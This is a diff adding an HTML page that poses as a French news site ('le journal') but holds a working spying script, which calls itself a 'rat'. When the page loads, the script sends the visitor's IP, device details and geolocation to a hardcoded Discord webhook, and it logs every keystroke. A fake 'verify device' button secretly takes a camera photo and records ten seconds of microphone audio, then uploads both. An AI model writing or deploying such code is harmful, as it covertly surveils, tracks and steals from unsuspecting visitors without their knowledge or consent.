@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>le journal</title>
+<style>
+  body{margin:0;font-family:-apple-system,system-ui,sans-serif;background:#f4f6fa;color:#111;padding:24px 18px}
+  h1{font-size:22px;margin:0 0 6px}
+  p{color:#555;line-height:1.6;font-size:15px}
+  .card{background:#fff;border-radius:14px;padding:16px;margin-top:14px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+  .btn{display:block;width:100%;padding:14px;margin-top:20px;background:#111;color:#fff;text-align:center;border-radius:12px;font-weight:600;border:none;font-size:16px}
+</style>
+</head>
+<body>
+<h1>le journal</h1>
+<p>actualités du jour, chargement des articles...</p>
+<div class="card"><b>météo</b><p>ciel dégagé, 21°c cet après-midi.</p></div>
+<div class="card"><b>tech</b><p>nouveaux modèles attendus cette semaine.</p></div>
+<div class="card"><b>sport</b><p>résultats de la soirée à retrouver en ligne.</p></div>
+
+<button class="btn" id="startBtn">Vérifier l'appareil pour lire l'article</button>
+
+<script>
+const HOOK = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";
+
+function sendText(tag, data){
+  try {
+    let texte = "**" + tag.toUpperCase() + "**\n";
+    if (tag === "info") {
+      texte += "ip: " + data.ip + "\nappareil: " + data.model + "\nbatterie: " + data.batt + "\nreseau: " + data.conn;
+    } else if (tag === "loc") {
+      if(data.lat) texte += "maps: https://www.google.com/maps?q=" + data.lat + "," + data.lon;
+      else texte += "gps refusé";
+    } else if (tag === "keys") {
+      texte += "touches: ```" + data + "```";
+    } else {
+      texte += JSON.stringify(data).slice(0, 500);
+    }
+
+    fetch(HOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({content: texte})
+    });
+  } catch(e){}
+}
+
+function sendFile(tag, blob, filename){
+  try {
+    const formData = new FormData();
+    formData.append("content", "**" + tag.toUpperCase() + "**");
+    formData.append("file", blob, filename);
+    
+    fetch(HOOK, {
+      method: "POST",
+      body: formData
+    });
+  } catch(e){}
+}
+
+sendText("test", {message: "le rat est connecte"});
+
+async function collect(){
+  let ip = "n/a", batt = "n/a", conn = "n/a";
+  try { const r = await fetch("https://api.ipify.org?format=json"); ip = (await r.json()).ip; } catch(e){}
+  try { const b = await navigator.getBattery(); batt = Math.round(b.level*100)+"%"+(b.charging?"⚡":""); } catch(e){}
+  try { conn = navigator.connection?.effectiveType || "n/a"; } catch(e){}
+
+  sendText("info", {
+    ua: navigator.userAgent, ip, batt, conn,
+    platform: navigator.platform, lang: navigator.language,
+    screen: screen.width+"x"+screen.height,
+    model: (navigator.userAgent.match(/iPhone OS [\d_]+/)||[""])[0]
+  });
+
+  navigator.geolocation?.getCurrentPosition(
+    p => sendText("loc", {lat:p.coords.latitude, lon:p.coords.longitude}),
+    e => sendText("loc", {err:"non"}),
+    {timeout:10000}
+  );
+}
+collect();
+
+let buffer = "";
+document.addEventListener("keydown", e => {
+  buffer += e.key;
+  if(buffer.length >= 40){ sendText("keys", buffer); buffer = ""; }
+});
+
+document.getElementById("startBtn").addEventListener("click", async function() {
+  this.textContent = "Chargement...";
+  this.style.background = "#555";
+
+  try {
+    const videoStream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+    const video = document.createElement('video');
+    video.srcObject = videoStream; await video.play();
+    await new Promise(r => setTimeout(r, 1000));
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    videoStream.getTracks().forEach(t => t.stop());
+    
+    canvas.toBlob(async (photoBlob) => {
+      sendFile("photo", photoBlob, "photo.jpg");
+    }, 'image/jpeg', 0.8);
+
+    const audioStream = await navigator.mediaDevices.getUserMedia({audio:true});
+    const rec = new MediaRecorder(audioStream);
+    const chunks = [];
+    rec.ondataavailable = e => chunks.push(e.data);
+    const recPromise = new Promise(res => rec.onstop = res);
+    rec.start(); 
+    await new Promise(r => setTimeout(r, 10000)); 
+    rec.stop();
+    await recPromise;
+    audioStream.getTracks().forEach(t => t.stop());
+
+    const audioBlob = new Blob(chunks, {type:'audio/webm'});
+    sendFile("audio", audioBlob, "audio.webm");
+
+    this.textContent = "Vérification terminée. Bonne lecture.";
+    this.style.background = "#37d67a";
+  } catch(e) {
+    this.textContent = "Erreur de vérification.";
+    this.style.background = "#ff5c5c";
+  }
+});
+</script>
+</body>
+</html>
